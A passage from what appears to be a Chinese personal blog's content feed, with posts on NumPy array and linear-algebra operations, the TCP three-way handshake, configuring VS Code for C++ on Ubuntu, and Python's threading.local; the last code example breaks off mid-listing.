class="line-numbers-rows"><span></span></span></code></pre><pre><code>9  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>prod<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#所有元素的乘积  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>24  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#所有元素的算数平均值  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>3.0  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>max<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 所有元素的最大值  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>4  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>min<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 所有元素的最小值  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>2  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>clip<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 小于3的元素替换为3，大于4的元素替换为4  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([3, 3, 4])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>a<span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 返回大于2的元素构成的数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([3, 4])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>tolist<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 返回python的list  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>[3, 2, 4]  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>var<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 计算方差（元素与均值之差的平方的均值）  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>0.6666666666666666  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>std<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 计算标准差  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>0.816496580927726  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>ptp<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 返回数组的最大值和最小值之差  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>2  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>argmin<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回最小值在扁平数组中的索引  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>1  </code></pre><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回最大值在扁平数组中的索引  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>2  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>where<span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回所有值为2的元素的索引  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>(array([1], dtype=int64),)  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>diff<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回相邻元素的差  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([-1,  2])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>log<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回对数数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([1.09861229, 0.69314718, 1.38629436])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回指数数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([20.08553692,  7.3890561 , 54.59815003])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回开方数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([1.73205081, 1.41421356, 2.        ])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>msort<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 数组排序  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([2, 3, 4])  </code></pre><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  b <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  np<span class="token punctuation">.</span>maximum<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 返回多个数组中对应位置元素的最大值数组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>array([8, 5, 7])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>minimum<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 返回多个数组中对应位置元素的最小值  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([1, 4, 2])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>true_divide<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 对整数实现真正的数学除法运算  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([0.125, 0.8  , 3.5  ])  </code></pre><h2 id="2-矩阵对象"><a href="#2-矩阵对象" class="headerlink" title="2 矩阵对象"></a>2 矩阵对象</h2><p>矩阵有的特性可以加速运算, matrix是矩阵对象，继承自ndarray类型，因此含有ndarray的所有数据属性和方法，不过当你吧矩阵对象当作数组操作时需要注意以下几点：  </p><ul><li><strong>matrix对象总是二维的，即使是展平（ravel函数）操作或者是成员选择，返回值也是二维的</strong>  </li><li><strong>matrix队形和darray对象回合的运算总是返回matrix对象</strong>  </li></ul><h3 id="2-1-创建矩阵"><a href="#2-1-创建矩阵" class="headerlink" title="2.1 创建矩阵"></a>2.1 创建矩阵</h3><p>matrix对象可以使用一个matlab风格的字符串来创建（以空格分隔列，已分号分隔行的字符床），也可以用数组来创建。  </p><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>mat<span class="token punctuation">(</span><span class="token string">'1 4 5; 2 3 5; 56 3 1'</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>matrix([[ 1,  4,  5],          [ 2,  3,  5],          [56,  3,  1]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>mat<span class="token punctuation">(</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>matrix([[1, 2, 3],          [4, 5, 6],          [7, 8, 9]])  </code></pre><h3 id="2-2-矩阵特有的属性"><a href="#2-2-矩阵特有的属性" class="headerlink" title="2.2 矩阵特有的属性"></a>2.2 矩阵特有的属性</h3><pre class="line-numbers language-python"><code class="language-python">m <span class="token operator">=</span> np<span class="token punctuation">.</span>mat<span class="token punctuation">(</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  m  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>matrix([[1, 2, 3],          [4, 5, 6],          [7, 8, 9]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">m<span class="token punctuation">.</span>T <span class="token comment" spellcheck="true"># 返回矩阵的转置  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>matrix([[1, 4, 7],          [2, 5, 8],          [3, 6, 9]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">m<span class="token punctuation">.</span>H <span class="token comment" spellcheck="true"># 返回矩阵的共轭转置  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>matrix([[1, 4, 7],          [2, 5, 8],          [3, 6, 9]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">m<span class="token punctuation">.</span>I <span class="token comment" spellcheck="true"># 返回自身的逆矩阵  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>matrix([[ 3.15251974e+15, -6.30503948e+15,  3.15251974e+15],          [-6.30503948e+15,  1.26100790e+16, -6.30503948e+15],          [ 3.15251974e+15, -6.30503948e+15,  3.15251974e+15]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">m<span class="token punctuation">.</span>A <span class="token comment" spellcheck="true">#返回自身数据的二维数组的一个视图  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[1, 2, 3],         [4, 5, 6],         [7, 8, 9]])  </code></pre><h3 id="2-3-矩阵乘法"><a href="#2-3-矩阵乘法" class="headerlink" title="2.3 矩阵乘法"></a>2.3 矩阵乘法</h3><p>对ndarray对象而言，星号是按元素相乘，dot()函数则当作矩阵相乘。对于matrix而言，星号和dot()函数都是矩阵相乘。特别的，对于一维数组，dot()函数实现的是向量点乘，但星号实现的却不是叉乘  </p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  b <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  a <span class="token operator">*</span> b <span class="token comment" spellcheck="true"># 一维数组元素相乘  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>array([ 4, 10, 18])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 一维数组元素相乘，再求和  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>32  </code></pre><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  b <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  a <span class="token operator">*</span> b <span class="token comment" spellcheck="true"># 多维数组，元素相乘  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>array([[ 5, 12],         [21, 32]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#多维数组，实现矩阵相乘  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[19, 22],         [43, 50]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">m <span class="token operator">=</span> np<span class="token punctuation">.</span>mat<span class="token punctuation">(</span>a<span class="token punctuation">)</span>  n <span class="token operator">=</span> np<span class="token punctuation">.</span>mat<span class="token punctuation">(</span>b<span class="token punctuation">)</span>  np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 矩阵相乘  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>matrix([[19, 22],          [43, 50]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">m <span class="token operator">*</span> n <span class="token comment" spellcheck="true"># 矩阵相乘  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>matrix([[19, 22],          [43, 50]])  </code></pre><h2 id="3-线性代数模块"><a href="#3-线性代数模块" class="headerlink" title="3 线性代数模块"></a>3 线性代数模块</h2><p>numpy.linalg是numpy的线性代数模块， 可以用来解决逆矩阵、特征值、线性方程组以及行列式等问题  </p><h3 id="3-1-计算逆矩阵"><a href="#3-1-计算逆矩阵" class="headerlink" title="3.1 计算逆矩阵"></a>3.1 计算逆矩阵</h3><p>尽管matrix对象本身有逆矩阵属性，但用numpy.linalg模块来求解矩阵的逆，也是非常简单的。  </p><pre class="line-numbers language-python"><code class="language-python">m <span class="token operator">=</span> np<span class="token punctuation">.</span>mat<span class="token punctuation">(</span><span class="token string">'0 1 2; 1 0 3; 4 -3 8'</span><span class="token punctuation">)</span>  mi <span class="token operator">=</span> np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>inv<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mi即为m的逆矩阵  </span>m <span class="token operator">*</span> mi  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>matrix([[1., 0., 0.],          [0., 1., 0.],          [0., 0., 1.]])  </code></pre><h3 id="3-2-计算行列式"><a href="#3-2-计算行列式" class="headerlink" title="3.2 计算行列式"></a>3.2 计算行列式</h3><pre class="line-numbers language-python"><code class="language-python">m <span class="token operator">=</span> np<span class="token punctuation">.</span>mat<span class="token punctuation">(</span><span class="token string">'0 1 2; 1 0 3; 4 -3 8'</span><span class="token punctuation">)</span>  np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>det<span class="token punctuation">(</span>m<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>-2.0  </code></pre><h3 id="3-3-计算特征值和特征向量"><a href="#3-3-计算特征值和特征向量" class="headerlink" title="3.3 计算特征值和特征向量"></a>3.3 计算特征值和特征向量</h3><pre class="line-numbers language-python"><code class="language-python">m <span class="token operator">=</span> np<span class="token punctuation">.</span>mat<span class="token punctuation">(</span><span class="token string">'0 1 2; 1 0 3; 4 -3 8'</span><span class="token punctuation">)</span>  np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>eigvals<span class="token punctuation">(</span>m<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 计算特征值  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>array([ 7.96850246, -0.48548592,  0.51698346])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>eig<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 返回特征值及其对应的特征向量的元组  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>(array([ 7.96850246, -0.48548592,  0.51698346]),   matrix([[ 0.26955165,  0.90772191, -0.74373492],           [ 0.36874217,  0.24316331, -0.65468206],           [ 0.88959042, -0.34192476,  0.13509171]]))  </code></pre><h3 id="3-4-求解线性方程组"><a href="#3-4-求解线性方程组" class="headerlink" title="3.4 求解线性方程组"></a>3.4 求解线性方程组</h3><p>x - 2y + z = 0<br><br>2y - 8z = 8<br><br>-4x + 5y + 9z = -9  </p><pre class="line-numbers language-python"><code class="language-python">A <span class="token operator">=</span> np<span class="token punctuation">.</span>mat<span class="token punctuation">(</span><span class="token string">'1 -2 1; 0 2 -8; -4 5 9'</span><span class="token punctuation">)</span>  b <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>solve<span class="token punctuation">(</span>A<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># x = 29, y=16, z=3  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>array([29., 16.,  3.])  </code></pre><p>写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP的三次握手</title>
      <link href="/2019/06/29/2019-tcp-san-ci-wo-shou/"/>
      <url>/2019/06/29/2019-tcp-san-ci-wo-shou/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h1><h2 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP/IP协议"></a>TCP/IP协议</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>TCP/IP协议是一个协议族，里面包括了IP协议，IMCP协议，TCP协议，以及我们更加熟悉的http、ftp、pop3协议等等，这些协议类似于国际语言，大家在交流时同一使用的语言。  </p><h3 id="TCP-IP协议的分层"><a href="#TCP-IP协议的分层" class="headerlink" title="TCP/IP协议的分层"></a>TCP/IP协议的分层</h3><h4 id="OSI参考模型自上而下分别是"><a href="#OSI参考模型自上而下分别是" class="headerlink" title="OSI参考模型自上而下分别是"></a>OSI参考模型自上而下分别是</h4><table><thead><tr><th align="center">OSI参考模型</th><th align="center">TCP/IP五层模型</th></tr></thead><tbody><tr><td align="center">应用层，表示层，会话层，传输层</td><td align="center">应用层</td></tr><tr><td align="center">传输层</td><td align="center">传输层</td></tr><tr><td align="center">网络层</td><td align="center">网络层</td></tr><tr><td align="center">数据链路层</td><td align="center">数据链路层</td></tr><tr><td align="center">物理层</td><td align="center">物理层</td></tr></tbody></table><h4 id="各层的作用"><a href="#各层的作用" class="headerlink" title="各层的作用"></a>各层的作用</h4><ul><li>应用层  <ul><li>向用户提供常用的应用程序，比如电子邮件（pop3），文件传输（FTP），远程登录（TELNET）等。  </li></ul></li><li>传输层  <ul><li>提供应用程序间的通信。功能包括：1、格式化信息流；2、提供可靠传输服务。为实现后者，传输层协议规定接收端必须返回确认信息，如果分组丢失，必须重新发送。  </li></ul></li><li>网络层  <ul><li>负责相邻计算机之间的通信。功能包括三方面  <ol><li>处理来自传输层的分组发送请求，收到请求后，将分组装入IP数据报，填充报头，选择去往信宿机的路径，然后将数据报发往适当的网络接口。  </li><li>处理输入数据报：首先检查合法性，然后进行寻径–假如该数据报已到达信宿机则去掉报头，将剩下的部分交给适当的传输协议；假如该数据报未到达信宿，则转发数据报。  </li><li>处理路径、流控、拥塞等问题。  </li></ol></li></ul></li><li>数据链路层  <ul><li>一般用来处理连接硬件的部分，包括控制网卡，硬件相关的设备驱动等。传输单位数据帧。  </li></ul></li></ul><h2 id="TCP三次握手-1"><a href="#TCP三次握手-1" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h2><ol><li>Client 将标志SYN置为1， 随机产生一个seq=J， 并将该数据包发送各Server，Client进入SYN_SENT状态，等待Server确认  </li><li>Server接收到client的SYN后，把这个连接信息放到半连接队列中，由标志位syn=1知道client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个seq=k， 并将该数据包发送给client已确认连接请求, server 进入SYN_RCVD状态。  <blockquote><p>syn floor 攻击就是针对半连接队列，攻击方不停的连接，但是连接只做第一步，第二步中攻击方收到server的syn+ack后故意扔掉什么也不做， 导致server上这个队列满，其他正常请求无法进来。  </p></blockquote></li><li>client收到确认后，检查ack是否位J+1， ACK是否为1， 如果正确则标志位ACK置为1， ack=K+1， 并将该数据包发送给server， server检查ack是否为K+1， ACK是否为1，如果正确则建立连接成功，将连接信息从半连接队列中拿出放入全连接队列中。 client和server进入ESTABLISHED状态，完成三次握手，随后client和server之间便可以开始传数据了。  <blockquote><p>如果此时全连接队列已满并且tcp_abort_on_overflow是0的话,server过一段时间会再次发送syn+ack给client(也就是重走第二步), 如果client的超时等待不叫段的, client就很容易异常了。  </p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vs的c++环境配置</title>
      <link href="/2019/06/02/2019-ubuntu-vscode-c-huan-jing/"/>
      <url>/2019/06/02/2019-ubuntu-vscode-c-huan-jing/</url>
      
        <content type="html"><![CDATA[<h1 id="在ubuntu中-配置vscode-的-C-环境"><a href="#在ubuntu中-配置vscode-的-C-环境" class="headerlink" title="在ubuntu中 配置vscode 的 C++ 环境"></a>在ubuntu中 配置vscode 的 C++ 环境</h1><h2 id="安装C-环境"><a href="#安装C-环境" class="headerlink" title="安装C++环境"></a>安装C++环境</h2><ul><li><code>sudo apt install gcc</code>  </li><li><code>sudo apt install g++</code>  </li></ul><h2 id="配置vscode"><a href="#配置vscode" class="headerlink" title="配置vscode"></a>配置vscode</h2><ul><li><p>点击左侧齿轮按纽，点击弹出窗口的齿轮按钮添加环境  </p></li><li><p>然后点击设置会生成一个后缀为json的文件，将其中的内容修改为  </p><pre><code>  {    // Use IntelliSense to learn about possible attributes.    // Hover to view descriptions of existing attributes.    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387    &quot;version&quot;: &quot;0.2.0&quot;,    &quot;configurations&quot;: [        {            &quot;name&quot;: &quot;(gdb) Launch&quot;,            &quot;type&quot;: &quot;cppdbg&quot;,            &quot;request&quot;: &quot;launch&quot;,            &quot;program&quot;: &quot;${workspaceFolder}/${fileBasenameNoExtension}.out&quot;,            &quot;args&quot;: [],            &quot;stopAtEntry&quot;: true,            &quot;cwd&quot;: &quot;${workspaceFolder}&quot;,            &quot;environment&quot;: [],            &quot;externalConsole&quot;: false,            &quot;MIMode&quot;: &quot;gdb&quot;,            &quot;preLaunchTask&quot;: &quot;build&quot;,            &quot;setupCommands&quot;: [                {                    &quot;description&quot;: &quot;Enable pretty-printing for gdb&quot;,                    &quot;text&quot;: &quot;-enable-pretty-printing&quot;,                    &quot;ignoreFailures&quot;: true                }            ]        }]    }  </code></pre><ul><li>在同一文件夹下创建名为<code>tasks.json</code>的文件,并将其修改为  <pre><code>{      // See https://go.microsoft.com/fwlink/?LinkId=733558      // for the documentation about the tasks.json format      &quot;version&quot;: &quot;2.0.0&quot;,      &quot;tasks&quot;: [          {              &quot;label&quot;: &quot;build&quot;,              &quot;type&quot;: &quot;shell&quot;,              &quot;command&quot;: &quot;g++&quot;,              &quot;args&quot;: [&quot;-g&quot;, &quot;${file}&quot;, &quot;-std=c++11&quot;, &quot;-o&quot;, &quot;${fileBasenameNoExtension}.out&quot;]          }      ]  }  </code></pre></li></ul></li></ul><blockquote><p>这就配置好了,按f5就可以调试了  </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程全局变量ThreadLocal</title>
      <link href="/2019/05/13/2019-python-xian-cheng-nei-bu-han-shu-chuan-can/"/>
      <url>/2019/05/13/2019-python-xian-cheng-nei-bu-han-shu-chuan-can/</url>
      
        <content type="html"><![CDATA[<h3 id="线程内的全局变量-ThreadLocal"><a href="#线程内的全局变量-ThreadLocal" class="headerlink" title="线程内的全局变量-ThreadLocal"></a>线程内的全局变量-ThreadLocal</h3><ul><li><p>对于每个线程获取变量值时， 只能使用函数进行传值，但对于多级函数，传参比较麻烦  </p></li><li><p>ThreadLocal解决方案  </p><pre class="line-numbers language-python"><code class="language-python">  <span class="token keyword">import</span> threading    <span class="token comment" spellcheck="true"># 创建全局ThreadLocal变量  </span>  local_school <span class="token operator">=</span> threading<span class="token punctuation">.</span>local<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">process_student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 获取当前线程关联的studnet  </span>      std <span class="token operator">=</span> local_school<span class="token punctuation">.</span>student        <span class="token comment" spellcheck="true"># 对当前线程的全局变量拥有修改权  </span>      local_school<span class="token punctuation">.</span>student <span class="token operator">=</span> <span class="token string">'my'</span><span class="token operator">+</span>local_school<span class="token punctuation">.</span>student        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello, %s (in %s)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>std<span class="token punctuation">,</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">process_stu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 对当前线程的全局变量拥有修改权  </span>      std <span class="token operator">=</span> local_school<span class="token punctuation">.</span>student        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello, %s (in %s)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>std<span class="token punctuation">,</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">process_thread</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 绑定ThreadLocal的studnet  </span>      local_school<span class="token punctuation">.</span>student <span class="token operator">=</span> name        process_student<span class="token punctuation">(</span><span class="token punctuation">)</span>        process_stu<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>local_school<span class="token punctuation">.</span>student<span class="token punctuation">)</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>process_thread<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Alce'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"Thread-A"</span><span class="token punctuation">)</span>    t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>process_thread<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Bob'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"Thread-B"</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>join<span 